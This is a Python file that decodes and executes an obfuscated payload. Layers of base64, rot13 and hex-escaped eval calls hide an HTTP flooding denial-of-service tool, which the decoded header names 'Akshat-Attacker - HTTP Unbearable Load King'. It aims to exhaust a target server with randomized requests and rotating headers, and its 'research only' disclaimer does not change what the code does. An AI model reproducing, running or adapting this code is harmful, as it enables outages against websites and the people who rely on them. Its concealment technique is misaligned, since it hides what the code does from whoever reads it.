import base64, codecs
magic = 'IyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEFrc2hhdC1BdHRhY2tlciAtIEhUVFAgVW5iZWFyYWJsZSBMb2FkIEtpbmcNCiMNCiMgdGhpcyB0b29sIGlzIGEgZG9zIHRvb2wgdGhhdCBpcyBtZWFudCB0byBwdXQgaGVhdnkgbG9hZCBvbiBIVFRQIHNlcnZlcnMgaW4gb3JkZXIgdG8gYnJpbmcgdGhlbQ0KIyB0byB0aGVpciBrbmVlcyBieSBleGhhdXN0aW5nIHRoZSByZXNvdXJjZSBwb29sLCBpdHMgaXMgbWVhbnQgZm9yIHJlc2VhcmNoIHB1cnBvc2VzIG9ubHkNCiMgYW5kIGFueSBtYWxpY2lvdXMgdXNhZ2Ugb2YgdGhpcyB0b29sIGlzIHByb2hpYml0ZWQuDQojDQojIGF1dGhvciA6ICBBa3NoYXQgSm9zaGkgLCB2ZXJzaW9uIDEuMA0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQppbXBvcnQgdXJsbGliMg0KaW1wb3J0IHN5cw0KaW1wb3J0IHRocmVhZGluZw0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHJlDQoNCiNnbG9iYWwgcGFyYW1zDQp1cmw9JycNCmhvc3Q9JycNCmhlYWRlcnNfdXNlcmFnZW50cz1bXQ0KaGVhZGVyc19yZWZlcmVycz1bXQ0KcmVxdWVzdF9jb3VudGVyPTANCmZsYWc9MA0Kc2FmZT0wDQoNCmRlZiBpbmNfY291bnRlcigpOg0KCWdsb2JhbCByZXF1ZXN0X2NvdW50ZXINCglyZXF1ZXN0X2NvdW50ZXIrPTENCg0KZGVmIHNldF9mbGFnKHZhbCk6DQoJZ2xvYmFsIGZsYWcNCglmbGFnPXZhbA0KDQpkZWYgc2V0X3NhZmUoKToNCglnbG9iYWwgc2FmZQ0KCXNhZmU9MQ0KCQ0KIyBnZW5lcmF0ZXMgYSB1c2VyIGFnZW50IGFycmF5DQpkZWYgdXNlcmFnZW50X2xpc3QoKToNCglnbG9iYWwgaGVhZGVyc191c2VyYWdlbnRzDQoJaGVhZGVyc191c2VyYWdlbnRzLmFwcGVuZCgnTW96aWxsYS81LjAgKFgxMTsgVTsgTGludXggeDg2XzY0OyBlbi1VUzsgcnY6MS45LjEuMykgR2Vja28vMjAwOTA5MTMgRmlyZWZveC8zLjUuMycpDQoJaGVhZGVyc191c2VyYWdlbnRzLmFwcGVuZCgnTW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNi4xOyBlbjsgcnY6MS45LjEuMykgR2Vja28vMjAwOTA4MjQgRmlyZWZveC8zLjUuMyAoLk5FVCBDTFIgMy41LjMwNzI5KScpDQoJaGVhZGVyc191c2VyYWdlbnRzLmFwcGVuZCgnTW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNS4yOyBlbi1VUzsgcnY6MS45LjEuMykgR2Vja28vMjAwOTA4MjQgRmlyZWZve'
love = 'P8mYwHhZlNbYx5SIPOQGSVtZl41YwZjAmV5XFpcQDbWnTIuMTIlp191p2IlLJqyoaEmYzSjpTIhMPtaGJ96nJkfLF81YwNtXSqcozEiq3Z7VSH7VSqcozEiq3ZtGyDtAv4kBlOyov1IHmftpaL6ZF45YwRhZFxtE2Iwn28iZwNjBGN3ZGttEzylMJMirP8mYwHhZFpcQDbWnTIuMTIlp191p2IlLJqyoaEmYzSjpTIhMPtaGJ96nJkfLF81YwNtXSqcozEiq3Z7VSH7VSqcozEiq3ZtGyDtAF4kBlOyov1IHlxtDKOjoTIKMJWYnKDiAGZlYwRtXRgVIR1ZYPOfnJgyVRqyL2giXFOQnUWioJHiAP4jYwVkBF42VSAuMzSlnF81ZmVhZFpcQDbWnTIuMTIlp191p2IlLJqyoaEmYzSjpTIhMPtaGJ96nJkfLF80YwNtXTAioKOuqTyvoTH7VR1GFHHtBP4jBlOKnJ5xo3qmVR5HVQLhZGftI09KAwD7VSElnJEyoaDiAP4jBlOGGRAQZwftYx5SIPOQGSVtZv4jYwHjAmV3BlOWozMiHTS0nP4lXFpcQDbWnTIuMTIlp191p2IlLJqyoaEmYzSjpTIhMPtaGJ96nJkfLF80YwNtXTAioKOuqTyvoTH7VR1GFHHtBP4jBlOKnJ5xo3qmVR5HVQLhZQftIUWcMTIhqP80YwN7VSAZD0ZkBlNhGxIHVRAZHvNlYwNhAGN3Zwp7VP5BEIDtD0kFVQRhZF40ZmVlBlNhGxIHVRAZHvNmYwHhZmN3Zwx7VP5BEIDtD0kFVQZhZP4mZQplBFxaXD0XPJuyLJEypaAsqKAypzSaMJ50pl5upUOyozDbW01irzyfoTRiAP4jVPuwo21jLKEcLzkyBlOAH0ySVQthZQftI2yhMT93plOBIPN1YwV7VSqcowL0BlO4AwD7VSElnJEyoaDiAP4jXFpcQDbWnTIuMTIlp191p2IlLJqyoaEmYzSjpTIhMPtaGJ96nJkfLF80YwNtXTAioKOuqTyvoTH7VR1GFHHtBP4jBlOKnJ5xo3qmVR5HVQHhZGftIUWcMTIhqP80YwN7VSAJZGftYx5SIPOQGSVtZv4jYwHjAmV3BlOWozMiHTS0nP4lXFpcQDbWnTIuMTIlp191p2IlLJqyoaEmYzSjpTIhMPtaGJ96nJkfLF81YwNtXSqcozEiq3Z7VSH7VR1GFHHtAl4jBlOKnJ5xo3qmVR5HVQLhZQftMJ4gIIZcWlxAPtybMJSxMKWmK3ImMKWuM2IhqUZhLKOjMJ5xXPqAo3ccoTkuYmDhZPNbL29gpTS0nJWfMGftGIAWEFN2YwR7VSqcozEiq3ZtJSNcWlxAPtybMJSxMKWmK3ImMKWuM2IhqUZhLKOjMJ5xXPqCpTIlLF85YwtjVPuKnJ5xo3qmVR5HVQHhZwftIGftpaHcVSOlMKA0ol8lYwHhZwVtIzIlp2yiov8kZP41ZFpcQDbWpzI0qKWhXTuyLJEypaAsqKAypzSaMJ50plxAPt0XVlOaMJ5ypzS0MKZtLFOlMJMypzIlVTSlpzS5QDcxMJLtpzIzMKWypy9fnKA0XPx6QDbWM2kiLzSfVTuyLJEypaAspzIzMKWypaZAPtybMJSxMKWmK3WyMzIlMKWmYzSjpTIhMPtanUE0pQbiY3q3ql5ao29aoTHhL29gYm9kCFpcQDbWnTIuMTIlp19lMJMypzIlpl5upUOyozDbW2u0qUN6Yl93q3phqKAuqT'
god = '9kYXkuY29tL3NlYXJjaC9yZXN1bHRzP3E9JykNCgloZWFkZXJzX3JlZmVyZXJzLmFwcGVuZCgnaHR0cDovL2VuZ2FkZ2V0LnNlYXJjaC5hb2wuY29tL3NlYXJjaD9xPScpDQoJaGVhZGVyc19yZWZlcmVycy5hcHBlbmQoJ2h0dHA6Ly8nICsgaG9zdCArICcvJykNCglyZXR1cm4oaGVhZGVyc19yZWZlcmVycykNCgkNCiNidWlsZHMgcmFuZG9tIGFzY2lpIHN0cmluZw0KZGVmIGJ1aWxkYmxvY2soc2l6ZSk6DQoJb3V0X3N0ciA9ICcnDQoJZm9yIGkgaW4gcmFuZ2UoMCwgc2l6ZSk6DQoJCWEgPSByYW5kb20ucmFuZGludCg2NSwgOTApDQoJCW91dF9zdHIgKz0gY2hyKGEpDQoJcmV0dXJuKG91dF9zdHIpDQoNCmRlZiB1c2FnZSgpOg0KCXByaW50ICctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nDQoJcHJpbnQgJ1VTQUdFOiBweXRob24gQWtzaGF0LUF0dGFja2VyLnB5IDx1cmw+Jw0KCXByaW50ICd5b3UgY2FuIGFkZCAic2FmZSIgYWZ0ZXIgdXJsLCB0byBhdXRvc2h1dCBhZnRlciBkb3MnDQoJcHJpbnQgJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScNCg0KCQ0KI2h0dHAgcmVxdWVzdA0KZGVmIGh0dHBjYWxsKHVybCk6DQoJdXNlcmFnZW50X2xpc3QoKQ0KCXJlZmVyZXJfbGlzdCgpDQoJY29kZT0wDQoJaWYgdXJsLmNvdW50KCI/Iik+MDoNCgkJcGFyYW1fam9pbmVyPSImIg0KCWVsc2U6DQoJCXBhcmFtX2pvaW5lcj0iPyINCglyZXF1ZXN0ID0gdXJsbGliMi5SZXF1ZXN0KHVybCArIHBhcmFtX2pvaW5lciArIGJ1aWxkYmxvY2socmFuZG9tLnJhbmRpbnQoMywxMCkpICsgJz0nICsgYnVpbGRibG9jayhyYW5kb20ucmFuZGludCgzLDEwKSkpDQoJcmVxdWVzdC5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgcmFuZG9tLmNob2ljZShoZWFkZXJzX3VzZXJhZ2VudHMpKQ0KCXJlcXVlc3QuYWRkX2hlYWRlcignQ2FjaGUtQ29udHJvbCcsICduby1jYWNoZScpDQoJcmVxdWVzdC5hZGRfaGVhZGVyKCdBY2NlcHQtQ2hhcnNldCcsICdJU08tODg1OS0xLHV0Zi04O3E9MC43LCo7cT0wLjcnKQ0KCXJlcXVlc3QuYWRkX2hlYWRlcignUmVmZXJlcicsIHJhbmRvbS5jaG9pY2UoaGVhZGVyc19yZWZlcmVycykgKyBidWlsZGJsb2NrKHJhbmRvbS5yYW5kaW50KDUsMTApKSkNCglyZXF1ZXN0LmFkZF9oZWFkZXIoJ0tlZXAtQWxpdmUnLCByYW5kb20ucmFuZGludCgxMTAsMTIwKSkNCglyZXF1ZXN0LmFkZF9oZWFkZXIoJ0Nvbm5lY3Rpb24nLCAna2VlcC1hbGl2ZScpDQoJcmVxdWVzdC5hZGRfaGVhZGVyKCdIb3N0Jyxob3N0KQ0KCXRyeToNCgkJCXVybGx'
destiny = 'cLwVhqKWfo3OyovulMKS1MKA0XD0XPJI4L2IjqPO1pzkfnJVlYxuHISOSpaWipvjtMGbAPtxWPFAjpzyhqPOyYzAiMTHAPtxWPKAyqS9zoTSaXQRcQDbWPDyjpzyhqPNaHzImpT9hp2HtD29xMFN1ZQNaQDbWPDywo2EyCGHjZN0XPJI4L2IjqPO1pzkfnJVlYyIFGRIlpz9lYPOyBt0XPDxWV3OlnJ50VTHhpzIup29hQDbWPDymrKZhMKucqPtcQDbWMJkmMGbAPtxWPJyhL19wo3IhqTIlXPxAPtxWPKIloTkcLwVhqKWfo3OyovulMKS1MKA0XD0XPKWyqUIlovuwo2EyXDxWQDbAPtxAPvAbqUEjVTAuoTkypvO0nUWyLJDtQDcwoTSmplOVISEDITulMJSxXUEbpzIuMTyhMl5HnUWyLJDcBt0XPJEyMvOlqJ4bp2IfMvx6QDbWPKElrGbAPtxWPKqbnJkyVTMfLJp8ZwbAPtxWPDywo2EyCJu0qUOwLJkfXUIloPxAPtxWPDycMvNbL29xMG09AGNjXFNzVPumLJMyCG0kXGbAPtxWPDxWp2I0K2MfLJpbZvxAPtxWMKuwMKO0VRI4L2IjqTyiovjtMKt6QDbWPDyjLKAmQDbAPvZtoJ9hnKEipaZtnUE0pPO0nUWyLJEmVTShMPOwo3IhqUZtpzIkqJImqUZAPzAfLKAmVR1iozy0o3WHnUWyLJDbqTulMJSxnJ5aYyEbpzIuMPx6QDbWMTIzVUW1ovumMJkzXGbAPtxWpUWyqzyiqKZ9pzIkqJImqS9wo3IhqTIlQDbWPKqbnJkyVTMfLJp9CGN6QDbWPDycMvNbpUWyqzyiqKZeZGNjCUWypKIyp3EsL291oaEypvxtWvNbpUWyqzyiqKZ8CaWypKIyp3EsL291oaEypvx6QDbWPDxWpUWcoaDtVvIxVSWypKIyp3EmVSAyoaDvVPHtXUWypKIyp3EsL291oaEypvxAPtxWPDyjpzI2nJ91pm1lMKS1MKA0K2AiqJ50MKVAPtxWnJLtMzkuMm09ZwbAPtxWPKOlnJ50VPWpov0gVRSep2uuqP1OqUEuL2gypvOOqUEuL2ftEzyhnKAbMJDtYF0vQDbAPvAyrTIwqKEyVN0XnJLtoTIhXUA5pl5upzq2XFN8VQV6QDbWqKAuM2HbXD0XPKA5pl5yrTy0XPxAPzIfp2H6QDbWnJLtp3ymYzSlM3MoZI09CFWbMJkjVwbAPtxWqKAuM2HbXD0XPDymrKZhMKucqPtcQDbWMJkmMGbAPtxWpUWcoaDtVv0gVRSep2uuqP1OqUEuL2gypvOOqUEuL2ftH3EupaEyMPNgYFVAPtxWnJLtoTIhXUA5pl5upzq2XG09VQZ6QDbWPDycMvOmrKZhLKWaqyflKG09VaAuMzHvBt0XPDxWPKAyqS9mLJMyXPxAPtxWqKWfVQ0tp3ymYzSlM3MoZI0APtxWnJLtqKWfYzAiqJ50XPViVvx9CGV6QDbWPDy1pzjtCFO1pzjtXlNvYlVAPtxWoFN9VUWyYaAyLKWwnPtaXTu0qUOmC1j6Yl8cCluoKv9qXvxiCl4dWljtqKWfXD0XPDybo3A0VQ0toF5apz91pPtlXD0XPDyzo3VtnFOcovOlLJ5aMFt1ZQNcBt0XPDxWqPN9VRuHISOHnUWyLJDbXD0XPDxWqP5mqTSlqPtcQDbWPKDtCFOAo25cqT9lITulMJSxXPxAPtxWqP5mqTSlqPtcQDb='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
